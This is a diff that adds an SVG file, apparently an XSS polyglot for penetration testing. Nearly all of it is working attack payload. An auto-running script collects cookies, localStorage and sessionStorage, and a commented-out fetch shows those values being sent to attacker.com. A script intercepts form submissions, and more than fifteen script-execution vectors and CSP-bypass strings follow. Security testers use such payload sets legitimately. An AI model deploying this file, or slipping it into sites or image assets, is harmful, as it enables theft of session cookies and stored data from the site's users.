@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Advanced SVG XSS Polyglot
+  Works as: SVG, HTML, XML, Image
+  For authorized security testing only
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 600 400">
+  <defs>
+    <!-- Filter with feScript (deprecated but works in some browsers) -->
+    <filter id="xss-filter">
+      <feScript xlink:href="data:,alert('XSS via feScript')" type="text/javascript"/>
+    </filter>
+  </defs>
+
+  <!-- 1. Script execution via onload -->
+  <script><![CDATA[
+    // Auto-executing payload
+    (function() {
+      const payload = {
+        domain: document.domain,
+        url: window.location.href,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        timestamp: new Date().toISOString()
+      };
+      console.log('SVG XSS Payload Executed:', payload);
+      // Exfiltration example (commented for safety)
+      // fetch('https://attacker.com/collect', {method:'POST', body:JSON.stringify(payload), keepalive:true});
+      alert('Advanced SVG XSS: ' + document.domain);
+    })();
+  ]]></script>
+
+  <!-- 2. Animation-based execution -->
+  <rect x="10" y="10" width="200" height="100" fill="#ff6b6b">
+    <animate attributeName="opacity" values="1;0;1" dur="2s" repeatCount="indefinite"
+             onbegin="console.log('Animation XSS trigger')" />
+    <animate attributeName="x" from="10" to="100" dur="1s"
+             onbegin="alert('XSS via animate onbegin')" />
+  </rect>
+
+  <!-- 3. ForeignObject with full HTML document -->
+  <foreignObject x="230" y="10" width="350" height="380">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <title>XSS in ForeignObject</title>
+        <script>
+          // Executes in HTML context within SVG
+          document.write('<h2>HTML Context XSS</h2>');
+          document.write('<p>Domain: ' + document.domain + '</p>');
+          document.write('<p>Cookies: ' + document.cookie + '</p>');
+          // Form hijacking example
+          const forms = document.forms;
+          for (let f of forms) {
+            f.addEventListener('submit', e => {
+              console.log('Form submission intercepted:', new FormData(f));
+            });
+          }
+        </script>
+      </head>
+      <body>
+        <h3>ForeignObject XSS Vector</h3>
+        <img src="x" onerror="alert('IMG onerror in ForeignObject')" />
+        <video onloadstart="alert('VIDEO onloadstart XSS')"></video>
+        <audio onloadstart="alert('AUDIO onloadstart XSS')"></audio>
+        <details open ontoggle="alert('DETAILS ontoggle XSS')"></details>
+        <input type="text" onfocus="alert('INPUT onfocus XSS')" autofocus />
+        <select onfocus="alert('SELECT onfocus XSS')"><option>XSS</option></select>
+        <textarea onfocus="alert('TEXTAREA onfocus XSS')"></textarea>
+      </body>
+    </html>
+  </foreignObject>
+
+  <!-- 4. Event handlers on all interactive elements -->
+  <g id="event-vectors">
+    <rect x="10" y="130" width="200" height="40" fill="#4ecdc4"
+          onclick="alert('CLICK XSS')"
+          onmousedown="alert('MOUSEDOWN XSS')"
+          onmouseup="alert('MOUSEUP XSS')"
+          onmouseover="alert('MOUSEOVER XSS')"
+          onmouseout="alert('MOUSEOUT XSS')"
+          onmousemove="console.log('MOUSEMOVE XSS')"
+          oncontextmenu="alert('CONTEXTMENU XSS')"
+          ondblclick="alert('DBLCLICK XSS')" />
+    <text x="20" y="155" fill="white" font-size="14" pointer-events="none">Hover/Click for XSS</text>
+
+    <circle cx="110" cy="220" r="40" fill="#45b7d1"
+            onload="alert('CIRCLE onload XSS')"
+            onfocus="alert('CIRCLE focus XSS')" tabindex="0" />
+  </g>
+
+  <!-- 5. XLink href javascript: URIs -->
+  <a xlink:href="javascript:alert('XSS via A xlink:href')">
+    <rect x="10" y="280" width="200" height="40" fill="#f9ca24" />
+    <text x="20" y="305" fill="black" font-size="14" pointer-events="none">Click: javascript: XSS</text>
+  </a>
+
+  <!-- 6. use element with external reference -->
+  <defs>
+    <symbol id="xss-symbol" viewBox="0 0 100 100">
+      <script><![CDATA[alert('XSS via use + symbol')]]></script>
+      <circle cx="50" cy="50" r="40" fill="#eb4d4b" />
+    </symbol>
+  </defs>
+  <use xlink:href="#xss-symbol" x="230" y="280" width="80" height="80"
+       onload="alert('USE onload XSS')" />
+
+  <!-- 7. Image with various XSS vectors -->
+  <image x="330" y="280" width="100" height="100"
+         xlink:href="javascript:alert('IMAGE xlink:href javascript:')"
+         onload="alert('IMAGE onload XSS')"
+         onerror="alert('IMAGE onerror XSS: ' + document.domain)" />
+
+  <!-- 8. TextPath with script -->
+  <defs>
+    <path id="text-path" d="M10,350 Q200,300 400,350" />
+    <script xlink:href="data:text/javascript,alert('XSS via script xlink:href')" />
+  </defs>
+  <text x="10" y="350" fill="#6c5ce7" font-size="16">
+    <textPath xlink:href="#text-path" onload="alert('TEXTPATH onload XSS')">
+      TextPath XSS Vector
+    </textPath>
+  </text>
+
+  <!-- 9. Pattern with script -->
+  <defs>
+    <pattern id="xss-pattern" patternUnits="userSpaceOnUse" width="100" height="100">
+      <script><![CDATA[alert('XSS via pattern')]]></script>
+      <rect width="100" height="100" fill="#a29bfe" />
+    </pattern>
+  </defs>
+  <rect x="450" y="280" width="100" height="100" fill="url(#xss-pattern)"
+        onload="alert('PATTERN fill onload XSS')" />
+
+  <!-- 10. ClipPath with script -->
+  <defs>
+    <clipPath id="xss-clip">
+      <script><![CDATA[alert('XSS via clipPath')]]></script>
+      <rect x="0" y="0" width="100" height="100" />
+    </clipPath>
+  </defs>
+  <rect x="10" y="340" width="100" height="40" fill="#fd79a8" clip-path="url(#xss-clip)"
+        onload="alert('CLIPPATH onload XSS')" />
+
+  <!-- 11. Mask with script -->
+  <defs>
+    <mask id="xss-mask">
+      <script><![CDATA[alert('XSS via mask')]]></script>
+      <rect x="0" y="0" width="100" height="100" fill="white" />
+    </mask>
+  </defs>
+  <rect x="130" y="340" width="100" height="40" fill="#00b894" mask="url(#xss-mask)"
+        onload="alert('MASK onload XSS')" />
+
+  <!-- 12. Cursor with script (works in some browsers) -->
+  <defs>
+    <cursor id="xss-cursor" xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('XSS via cursor')</script></svg>" />
+  </defs>
+  <rect x="250" y="340" width="100" height="40" fill="#e17055" cursor="url(#xss-cursor),auto"
+        onload="alert('CURSOR onload XSS')" />
+
+  <!-- 13. View with script -->
+  <view id="xss-view" viewBox="0 0 100 100">
+    <script><![CDATA[alert('XSS via view')]]></script>
+  </view>
+
+  <!-- 14. Metadata with script (executes in some parsers) -->
+  <metadata>
+    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+      <rdf:Description rdf:about="">
+        <script><![CDATA[alert('XSS via metadata')]]></script>
+      </rdf:Description>
+    </rdf:RDF>
+  </metadata>
+
+  <!-- 15. CSP Bypass attempt via data: URIs -->
+  <script><![CDATA[
+    // Attempt to bypass CSP using data: URIs
+    const bypassAttempts = [
+      'data:text/html,<script>alert("CSP bypass: data URI")</script>',
+      'data:text/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert("CSP bypass: SVG data URI")</script></svg>',
+      'javascript:alert("CSP bypass: javascript:")'
+    ];
+    console.log('CSP Bypass Vectors:', bypassAttempts);
+  ]]></script>
+
+  <!-- Info text -->
+  <text x="10" y="395" fill="#636e72" font-size="11" font-family="monospace">
+    Advanced SVG XSS Polyglot | Authorized Testing Only | Vectors: 15+
+  </text>
+</svg>
